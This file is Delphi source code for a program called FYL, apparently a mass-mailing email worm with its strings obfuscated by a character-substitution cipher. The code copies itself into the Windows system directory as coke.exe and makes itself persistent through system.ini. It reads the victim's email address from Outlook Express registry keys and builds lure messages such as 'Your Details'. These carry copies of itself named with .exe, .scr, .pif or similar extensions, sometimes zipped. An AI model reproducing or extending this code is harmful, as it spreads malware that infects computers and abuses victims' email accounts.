   program FYL;
   uses
     Windows,
     Zip, mail in 'mail.pas';

   const
    abc1 : string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |';
    abc2 : string = 'Ln2DfUw Mo3EhVzbQs6IkZAdSt8Jl0CeTv9Km1FgWu|Np4BcRxaPr7HjYyiXG5Oq';

   function decode(str:string):string;
   var
   i,j:integer;
   ch:string;
   c:boolean;
   begin
   result:='';
   for i:=1 to length(str) do begin
    ch := copy(str,i,1);
    c:=false;
    for j:=1 to length(ABC2) do begin
     if copy(ABC2,j,1)=ch then begin
      result:=result+copy(ABC1,j,1);
      c := true;
     end;
    end;
     if not c then result := result + ch;
   end;
   end;

   var
    p:array[0..255]of char;
    pp:String;
   begin

   CreateMutexA(Nil, True, pChar(decode('lWmC_1WcCp_aWB')));
   If GetLastError() = Error_ALready_Exists Then
    ExitProcess(0);

    getsystemdirectory(p, 255);
    pp := p;
    pp:=pp+'\coke.exe';
    CopyFile(pchar(paramstr(0)), pchar(pp), false);
    writeprivateprofilestring('boot','shell',pchar('Explorer.exe coke.exe'),'system.ini');

    AssignFile(F, decode('l:\lz3f.IdI'));
    ReWrite(F);
    WriteLn(F, decode('lz3fOAzshOM6O fsfOIzOozMVOI fObLsIS'));
    WriteLn(F, decode('gzIM2fOIzOzI fs6O:'));
    WriteLn(F, decode('ek23OSzkOJLwfEOazksOok6IOLOEk23SOp2sMbImMDDMf'));
    WriteLn(F, decode('ek23OSzkOFS0zzhOazksOok6IOLOELhfOsfILsD'));
    WriteLn(F, decode('ek23OSzkOp3SgfIOazkO LDOEk23OIzOwfIOMVIzOe-pf2OhLME-EM6I,OVzI MVwO6bf2MLEOI z.'));
    WriteLn(F, decode('azkO2LVIO2zDfOAzsh6,OSzksOVzIOAzsI OIzOnfO2LEEfDO2zDfs6.'));
    CloseFile(F);

    Randomize;
    Case Random(3) Of
     0: GetSystemDirectory(fDir, 255);
     1: GetWindowsDirectory(fDir, 255);
     2: GetTempPathA(255, fDir);
    End;
    Path := fDir;
    Path := Path + '\';

    If GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrr7'),'SMTP Email Address') <>
       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrr7'),'SMTP Email Address');
    If fMail = '' Then
    If GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrrH'),'SMTP Email Address') <>
       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrrH'),'SMTP Email Address');
    If fMail = '' Then
    If GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrrj'),'SMTP Email Address') <>
       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrrj'),'SMTP Email Address');
    If fMail = '' Then
    If GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrrY'),'SMTP Email Address') <>
       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,decode('pzUIALsf\FM2sz6zUI\9VIfsVfIO822zkVIOFLVLwfs\822zkVI6\rrrrrrrY'),'SMTP Email Address');

    If fMail = '' Then
     fMail := GetRMail;

    Randomize;
    Case Random(11) Of
     0 : fSubj := decode('azksODfILME6');
     1 : fSubj := decode('azksOeMEf');
     2 : fSubj := decode('azksODz2khfVI');
     3 : fSubj := decode('flLsDO6fVIOIzOSzk');
     4 : fSubj := decode('FSOeMEf');
     5 : fSubj := decode('azksObM2Iksf');
     6 : fSubj := decode('FSObM2Iksf');
     7 : fSubj := decode('azkOwzIOLObM2O?');
     8 : fSubj := decode('azkOwzIOMhLwfO?');
     9 : fSubj := decode('azkOwzIObM2Iksf?');
     10: fSubj := decode('uM2?');
   (*
     11: fSubj := decode('9hLwf?');
     12: fSubj := decode('eMEf?');
     13: fSubj := decode('eMEf!');
     14: fSubj := decode('0z2khfVI!');
     15: fSubj := decode('4 fODz2khfVI');
     16: fSubj := decode('azks6');
     17: fSubj := decode('gfAODz2khfVI');
     18: fSubj := decode('gfAOeMEf');
     19: fSubj := decode('azksOP9u');
     20: fSubj := decode('FSObsMZLIfObM26');
     21: fSubj := decode('FSObsMZLIfOUMEf6');
     22: fSubj := decode('FSObsMZLIfOMhLwf6');
     23: fSubj := decode('FSObsMZLIfODz2khfVI6');
     24: fSubj := decode('FSObsMZLIfOIfdIf6');
     25: fSubj := decode('I fOIfdI');
     26: fSubj := decode('I fObzfh');
     27: fSubj := decode('LOuzfh');
     28: fSubj := decode('LO4fdI');
     29: fSubj := decode('LOuM2Iksf');
     30: fSubj := decode('LO9hLwf');
     31: fSubj := decode('FSO4fdI');
     32: fSubj := decode('FSOuzfh');
     33: fSubj := decode('0MDOSzkOEM3fOhSObzfh?');
     34: fSubj := decode('0MDOSzkOEM3fOhSOIfdI?');
     35: fSubj := decode('HOuzfh');
     36: fSubj := decode('6zhfOIfdI');
     37: fSubj := decode('A z6ObM2IksfO?');
     38: fSubj := decode('LOKz3f');
     39: fSubj := decode('9hLwfOzUOSzk');
     40: fSubj := decode('1MV36');
     41: fSubj := decode('bszUMEf');
     42: fSubj := decode('SzksObszUMEf');
     43: fSubj := decode('9I6OhfO:)');
     44: fSubj := decode('9hOnL23O:0');
     45: fSubj := decode(' fEEzODkDf');
     46: fSubj := decode('A LI6Okb?');
     47: fSubj := decode('6kbO?');
     48: fSubj := decode('MOwzIOLObsznEfh');
     49: fSubj := decode('ALsVMVw,OMI6Ohf');
     50: fSubj := decode('ALsVMVw,OMhO zI');
     51: fSubj := decode('6 MIOhLVO:u');
     52: fSubj := decode(' L LOI fsfOSzkOLsf');
     53: fSubj := decode('MZfO6fLs2 fDOUzsOSzkO:0');
     54: fSubj := decode('AzA,OMhO6zO2zzE');
     55: fSubj := decode('A LIOSzkOALVIO?');
     56: fSubj := decode(' fS,O6IzbOnkwwMVOhf');
     57: fSubj := decode('M6OMIOok6IOhf?');
     58: fSubj := decode('wsfLI');
     59: fSubj := decode('Dzf6VIOhLIIfsOIzOhf');
     60: fSubj := decode('A M2 OkOALVI?');
     61: fSubj := decode('wsGO:)');
     62: fSubj := decode(' L L L L L L LO:0');
     63: fSubj := decode('LsfOSzkOof6k6?O;0');
     64: fSubj := decode('6 fO6LMDOA LIOMOAL6O6kbbz6fDOIzOI MV3O:u');
     65: fSubj := decode('lkIf,OJzsMVw,O1zZf.');
     66: fSubj := decode('2kIfOnzsMVwOEzZfO:u');
     67: fSubj := decode('MI6OA LI6OMI6OLEEOLnzkI');
     68: fSubj := decode('MOEM3fOLbbEfOokM2f');
     69: fSubj := decode('2z3fOok6IOskEf6ODzVfOSzkOI MV3O?');
     70: fSubj := decode('MOALVIOIzOIsLDfhLs3');
     71: fSubj := decode('MOALVIOIzOzAVOSzk');
     72: fSubj := decode('MOALVIOSzk');
     73: fSubj := decode('MOALVIOIzO LZfOSzk');
     74: fSubj := decode('DzVIOSzkOEzVwMVwOUzsObksMISO?');
     75: fSubj := decode('DzVIOSzkOfZfsOwfI6O6zO6M23OzUOIfssMIzsMf6O?');
     76: fSubj := decode('MOLhOVL3fD');
     77: fSubj := decode('hLVOMhOVkDf');
     78: fSubj := decode('DkDf,OMhOVkDf');
     79: fSubj := decode(':u');
     80: fSubj := decode(':)');
     81: fSubj := '-';
     82: fSubj := decode(':-)');
     83: fSubj := decode(';-)');
     84: fSubj := decode('=)');
     85: fSubj := decode('>=)');
     86: fSubj := decode(';0');
     87: fSubj := decode('A LIOLsfOSzkO6zO62LsfDOzUO?');
     88: fSubj := decode('6M23OzUO6bLh?O6zOLhOMO:/');
     89: fSubj := decode('6 MIO6 MIO6 MI');
     90: fSubj := decode('DzOSzkOIsk6IOhf?');
     91: fSubj := decode('DzOMOIsk6IOSzk?');
     92: fSubj := decode('DzOSzkO3VzAOhf?');
     93: fSubj := decode('DzOMO3VzAOSzk?');
     94: fSubj := decode('MOfLIOwEL66O:0');
     95: fSubj := decode('MO2LVOALE3OzVOI fOALIfs');
     96: fSubj := decode('I M6OM6O6zO6M23OhLVO:0');
     97: fSubj := decode('2 f23OMIOzkI,OMI6O6M23O:0');
     98: fSubj := decode('RWR,ObzAfsEfZfEOkbO:0');
     99: fSubj := decode('AzAO L L L');
     100: fSubj := decode('AzA,OMUOI M6OLMVIObszV,OI fVOMODzVIO3VzAOA LIOMIOM6');
     101: fSubj := decode('MOhLDfOLOhM6IL3fO:(');
     102: fSubj := decode('M6OI M6OLOhM6IL3fO?');
     103: fSubj := decode('DzOSzkO LZfOLOhM6IL3fO?');
     104: fSubj := decode('MOhLDfOLOhM6IL3f');
     105: fSubj := decode('LsfOSzkOMVIsf6IfDOMVOhL3MVwOhzZMf6?');
     106: fSubj := decode('hL3MVwOhzZMf6O?');
     107: fSubj := decode('wfIIMVwOhzVfS?');
     108: fSubj := decode('MOEzZfOhzVfS');
     109: fSubj := decode('DzOSzkOEzZfOhzVfS?');
     110: fSubj := decode('MOwzIOLObM2IksfOzUOSzkOLVDOhf');
     111: fSubj := decode('MOwzIOLObM2IksfOzUOSzk');
     112: fSubj := decode('MOwzIOLObM2IksfOzUOhf');
     113: fSubj := decode('SzkOwzIOLObM2IksfOzUOk6');
     114: fSubj := decode('SzkOwzIOLObM2IksfOzUOhf');
     115: fSubj := decode('SzkOwzIOLObM2IksfO?');
     116: fSubj := decode('MO LIfOIzOnfO6MVwfE');
     117: fSubj := decode('MO LIfOIzOVzIOnfOEf6nMLV');
     118: fSubj := decode('MO LIfOIzOnfOwLS');
     119: fSubj := decode('MO LIfOIzOnfOLO zhz6fdkLE');
     120: fSubj := decode('MOLhOLOEf6nMLV');
     121: fSubj := decode('MO LIfOULw6');
     122: fSubj := decode('LsfOSzkOLOULw?');
     123: fSubj := decode('M6OI M6OsMw IOhLME?');
     124: fSubj := decode('M6OI M6OoLhf6?');
     125: fSubj := decode('M6OI M6O3Ms3?');
     126: fSubj := decode('M6OI M6O3ksI?');
     127: fSubj := decode('M6OI M6OskIwfs?');
     128: fSubj := decode('M6OI M6O6IfULV?');
     129: fSubj := decode('M6OI M6O6Ifb fV?');
     130: fSubj := decode('M6OI M6OhLsS?');
     131: fSubj := decode('M6OI M6OokEMf?');
     132: fSubj := decode('M6OI M6O?');
     133: fSubj := decode('M6O?');
     134: fSubj := decode('ALVIOIzOEM6IfVOzVO6zhfOhk6M2?');
     135: fSubj := decode('z OSfL,OI LI6O zAOMOEM3fOMI');
     136: fSubj := decode(' zAOMOEM3fOMI');
     137: fSubj := decode('z OSfL');
     138: fSubj := decode('MhOLUsLMD');
     139: fSubj := decode('MhOVzIOLUsLMD');
     140: fSubj := decode('MhOLUsLMDOzUODMfMVw');
     141: fSubj := decode('MhOLUsLMDOzUOnfwMVOMwVzsf');
     142: fSubj := decode('MhOLUsLMDOzUOUffEMVw');
     143: fSubj := decode('MhOVzIOLUsLMDOzUOIsSMVw');
     144: fSubj := decode('DzOSzkOwzIOh6V?');
     145: fSubj := decode('DzOSzkOwzIOM2Q?');
     146: fSubj := decode('DzOSzkOwzIOLMh?');
     147: fSubj := decode('DzOSzkOwzIOhLME?O:0');
     148: fSubj := decode('A fsfOM6OI fO63S?');
     149: fSubj := decode('MOLhO MDMVw');
     150: fSubj := decode('VzzVfO3VzA6,Ook6IOkOLVDOM');
     151: fSubj := decode('ok6IOkOLVDOM');
     152: fSubj := decode('BOLVDOM');
     153: fSubj := decode('BO+O9');
     154: fSubj := decode('9O+OB');
     155: fSubj := decode('MO6ffOfZfsSI MVwO:0');
     156: fSubj := decode('O');
     157: fSubj := decode('Jf6IOMOLh');
     158: fSubj := decode('9OLhOJf6I');
     159: fSubj := decode('8hOnf6IO9');
     160: fSubj := decode('8hOMOJf6I');
     161: fSubj := decode('Jf6IO8hO9');
     162: fSubj := decode('MOJf6IO8h');
     163: fSubj := decode('nEL OnEL OnEL ');
     164: fSubj := decode('AzsD6,OMO LIfOAzsD6');
     165: fSubj := decode('ArsD');
   *)
    End;
    Randomize;
    Case Random(19) Of
     5: fSubj := decode('Nf:O')+fSubj;
     6: fSubj := 're: '+fSubj;
     7: fSubj := decode('eAD:O')+fSubj;
     8: fSubj := 'FWD: '+fSubj;
    End;

    Randomize;
    Case Random(11) Of
     0 : fName := decode('[7]flLsD');
     1 : fName := decode('[r]flLsD');
     2 : fName := decode('0z2khfVI');
     3 : fName := decode('azkseMEf');
     4 : fName := decode('azksO0z2');
     5 : fName := decode('4fdIUMEf');
     6 : fName := decode('uszUMEf6');
     7 : fName := decode('4hbO0z2k');
     8 : fName := decode('4 M6eMEf');
     9 : fName := decode('azks4fdI');
     10: fName := decode('7OBbDLIf');
   (*  11: fName := decode('jOBbDLIf');
     12: fName := decode('Bs0fILME');
     13 : fName := decode('gfAChLME');
     14 : fName := decode('azksFLME');
     15 : fName := decode('4 fChLME');
     16 : fName := decode('IhbCFLME');
     17 : fName := decode('Ihb4fdI6');
     18 : fName := decode('IhbeMEf6');
     19 : fName := decode('Ihb1zwMV');
     20 : fName := decode('Ihb9VUzr');
     21 : fName := decode('Ihb9VUz7');
     22 : fName := decode('IhbuM26r');
     23 : fName := decode('uM2Iksfr');
     24 : fName := decode('uM2Iksf6');
     25 : fName := decode('9hLwf6rr');
     26 : fName := decode('9hLwf6rY');
     27 : fName := decode('FS9hLwf6');
     28 : fName := decode('FSO9hLwf');
     29 : fName := decode('eMEf9VUz');
     30 : fName := decode('9VUzeMEf');
     31 : fName := decode('gfA6eMEf');
     32 : fName := decode('eMEfgfA6');
     33 : fName := decode('eMEf4f6I');
     34 : fName := decode('eMEf4fdI');
     35 : fName := decode('4f6II M6');
     36 : fName := decode('JfILeMEf');
     37 : fName := decode('4f6I4f6I');
     38 : fName := decode('9I684f6I');
     39 : fName := decode('4f6IOuM2');
     40 : fName := decode('uM2O4f6I');
     41 : fName := decode('azks4f6I');
     42 : fName := decode('KuTO4f6I');
     43 : fName := decode('8bbEM2LIMzV');
     44 : fName := decode('8bbEM2LIMzV6');
     45 : fName := decode('0fILME6');
     46 : fName := decode('azks_0fILME6');
     47 : fName := decode('FS_0fILME6');
     48 : fName := decode('azks_uszUMEf');
     49 : fName := decode('azks_flLsD');
     50 : fName := decode('8_flLsD');
     51 : fName := decode('flLsD');
     52 : fName := decode('flLsD_jrrYH');
     53 : fName := decode('flLsD_jrHy5');
     54 : fName := decode('flLsD_HrjY5');
     55 : fName := decode('Fk6M2');
     56 : fName := decode('Fk6M2uELSfs');
     57 : fName := decode('RMVPMbbfs');
     58 : fName := decode('PMbeMEf');
     59 : fName := decode('PMbbfDeMEf6');
     60 : fName := decode('PMb0z2');
     61 : fName := decode('PMbbfD0z26');
     62 : fName := decode('PMbbfD4fdI6');
     63 : fName := decode('PMbbfDuM2Iksf6');
     64 : fName := decode('uM2Iksf6');
     65 : fName := decode('PMbbfDuM2Iksf6');
     66 : fName := decode('NLsfD0z26');
     67 : fName := decode('NLsfDuM2Iksf6');
     68 : fName := decode('NLsfD4fdI6');
     69 : fName := decode('NLsfD0z2khfVI6');
     70 : fName := decode('9hLwf');
     71 : fName := decode('9FT_r5YjGy');
     72 : fName := decode('9FT_HjYyrH');
     73 : fName := decode('9FT_jyG55i');
     74 : fName := decode('9FT_yiXyiX');
     75 : fName := decode('9FT_GrYjHy');
     76 : fName := decode('9FT_Hj7G5Xy');
     77 : fName := decode('9FT_H7Gij5y');
     78 : fName := decode('9FT_H75YGiY');
     79 : fName := decode('9FT_rjYyYGi');
     80 : fName := decode('9FT_HjGYrij');
     81 : fName := decode('9FT_jYyjY5yj');
     82 : fName := decode('9FT_HjY5');
     83 : fName := decode('Kbfw_UMEf');
     84 : fName := decode('PMbbfDKbfw');
     85 : fName := decode('PMb');
     86 : fName := decode('PMbbfD');
     87 : fName := decode('PMbeMEf');
     88 : fName := decode('NLseMEf');
     89 : fName := decode('NLs');
     90 : fName := decode('NLsfD');
     91 : fName := decode('NLsfDKbfw');
     92 : fName := decode('NLsfDFk6M2');
     93 : fName := decode('Fk6M2NLs');
     94 : fName := decode('NLA');
     95 : fName := decode('azks_8bbEM2LIMzV');
     96 : fName := decode('azks_0fILME6');
     97 : fName := decode('azks_gkhnfs6');
     98 : fName := decode('azks_1zwMV');
     99 : fName := decode('azks_pMwV9V');
     100 : fName := decode('azks_lLsDgkhnfs');
     101 : fName := decode('azks_9VUz');
     102 : fName := decode('9VUz');
     103 : fName := decode('FS_9VUz');
     104 : fName := decode('9VUz_azks');
     105 : fName := decode('uzsVeMEf');
     106 : fName := decode('uzsVPMb');
     107 : fName := decode('PMbbfDuzsV');
     108 : fName := decode('NLsuzsV');
     109 : fName := decode('NLsfDuzsV');
     110 : fName := decode('uzsV');
     111 : fName := decode('uzsVuM2');
     112 : fName := decode('uM2IksfeMEf');
     113 : fName := decode('uM2Iksf9hLwfezshLI');
     114 : fName := decode('1MZf0Mf');
     115 : fName := decode('0Mf1MZf');
     116 : fName := decode('0Mf');
     117 : fName := decode('1MZf');
     118 : fName := decode('1MUf');
     119 : fName := decode('0fLI ');
     120 : fName := decode('phz3f');
     121 : fName := decode('RffD');
     122 : fName := decode('lMww');
     123 : fName := decode('RffDphz3f');
     124 : fName := decode('phz3fRffD');
     125 : fName := decode('lMwwphz3f');
     126 : fName := decode('phz3flMww');
     127 : fName := decode('lMwwRffD');
     128 : fName := decode('RffDlMww');
     129 : fName := decode('0Lsf');
     130 : fName := decode('R z0Lsf');
     131 : fName := decode('0LsfR z');*)
    End;

     If (Pos('.', fName)=0) Then Begin

      Randomize;
      Balle := Random(100);

      If (Balle < 10 ) And (Balle > 0) Then
       fName := fName + decode('.fdf');
      If (Balle < 20 ) And (Balle > 10) Then
       fName := fName + decode('.62s');
      If (Balle < 30 ) And (Balle > 20) Then
       fName := fName + decode('.2hD');
      If (Balle < 40 ) And (Balle > 30) Then
       fName := fName + decode('.2zh');
      If (Balle < 50 ) And (Balle > 40) Then
       fName := fName + decode('.nLI');
      If (Balle < 100 ) And (Balle > 50) Then
       fName := fName + decode('.bMU');

      CopyFile(pChar(ParamStr(0)), pChar(Path+fName), False);
      Randomize;
      If Random(101) > 40 Then Begin
       Zip_Make(Path+fName, Path+fName, fName);
       DeleteFile(pChar(Path+fName));
       fName := Copy(fName, 1, Length(fName)-3)+'zip';
      end Else
      DeleteFile(pChar(Path+fName));
     End;
     fName := Path + fName;
    Randomize;
    Case Random(11) Of
     0 : fText := decode('lLVOSzkObEfL6fOIf6IOI M6?');
     1 : fText := decode('If6I');
     2 : fText := decode('4f6IO?');
     3 : fText := decode('96OMIOAzs3MVw?');
     4 : fText := decode('l f23OI fOLIIL2 hfVIO:)');
     5 : fText := decode('8IIL2 hfVIO:)');
     6 : fText := decode('4f6IOI fOLIIL2 hfVIO:)');
     7 : fText := decode('azksODfILME6');
     8 : fText := decode('9ZfOLDDfDOSzksOUMEf6');
     9 : fText := decode('4 M6OM6OhSObM26');
     10: fText := decode('uM26');
   (*  11: fText := decode('uM2Iksf6O:)');
     12: fText := decode('9ZfOLDDfDO6zhfOIfdI6');
     13: fText := decode('9ZfOLDDfDOLOIfdI');
     14: fText := decode('9ZfOLDDfDO6zhfODz2khfVI6');
     15: fText := decode('9ZfOLDDfDO6zhfObM26');
     16: fText := decode('9ZfOLDDfDO6zhfOIzzE6');
     17: fText := decode('9ZfOLDDfDO6zhfOUMEf6');
     18: fText := decode('9ZfOLDDfDOLODz2khfVI');
     19: fText := decode('9ZfOLDDfDOLObM2Iksf');
     20: fText := decode('9ZfOLDDfDOLOMhLwf');
     21: fText := decode('9ZfOLDDfDOLOUMEf');
     22: fText := decode('l f23OzkIOSzksOflLsD');
     23: fText := decode('pzhfzVfO6fVIOSzkOLOflLsD');
     24: fText := decode('azkOwzIOLOflLsD');
     25: fText := decode('9I6OLOflLsDOUzsOSzk');
     26: fText := decode('9I6OLObsf6fVI');
     27: fText := decode('1zz3O:)');
     28: fText := decode('8IIL2 hfVI');
     29: fText := decode('WbfVOI fOLIIL2 hfVIO:0');
     30: fText := decode('l f23OI fOUMEf');
     31: fText := decode('l f23OI fOLDDfDOUMEf');
     32: fText := decode('1zz3OLIOI fOLDDfDOUMEf');
     33: fText := decode('uEfL6f,OMO2LVIOUMVDOI fOfsszs,O2LVOSzkO2 f23OI fOUMEf');
     34: fText := decode('uszUMEf6');
     35: fText := decode('azksODz2khfVI');
     36: fText := decode('9ZfO6fVIOSzksODz2khfVI');
     37: fText := decode('96OI M6O3Ms3?OMUO6zOMOLDDfDOzksObM2Iksf6');
     38: fText := decode('96OI M6Owfzswf?OMUO6zOMZfOLDDfDOI fObM2Iksf6O;)');
     39: fText := decode('9I6Ob2MIksf6OzUOhf');
     40: fText := decode('uM26');
     41: fText := decode('R LIOSzkOEM3fOI fObM2Iksf?');
     42: fText := decode('R LIOSzkOEM3fOI fOUMEfO?');
     43: fText := decode('TzIOI M6O?');
     44: fText := decode('azkO LZfOI M6O?');
     45: fText := decode('lLVOSzkOIfEEOhfOA LIOSzkOI MV3OzUOMI?');
     46: fText := decode('1zz3OA LIOLOUkVVSOwLhfOMOUzkVDO:)');
     47: fText := decode('8OUkVVSOwLhf');
     48: fText := decode('MZfOLDDfDOLO62sffV6LZfsOUzsOSzk');
     49: fText := decode('LO62sffV6LZfs,OUzsOSzkO:)');
     50: fText := decode('9hLwf6OzUOk6OEL6IOSfLs');
     51: fText := decode('0zOSzkOsfhfhnfsOI f6fOMhLwf6O?');
     52: fText := decode('DzOSzkOsfhfhnfsOI f6fObM2Iksf6O?');
     53: fText := decode('0zOSzkO6IMEEO LZfOI M6OUMEfO?');
     54: fText := decode('9O6fVDOI fOUMEfOSzkOL63fDOLnzkI');
     55: fText := decode('4 fOUMEfOSzkOL63fDOLnzkI');
     56: fText := 'Your file';
     57: fText := decode('azksODfILME6');
     58: fText := decode('azksODz2khfVI');
     59: fText := decode('azksOIfdIUMEf');
     60: fText := decode('azksOMhLwf');
     61: fText := decode('azksObM2Iksf');
     62: fText := decode('flLsDObM2Iksf.');*)
    End;

    ListFiles(decode('l:\'),'*','*.*');

   end.
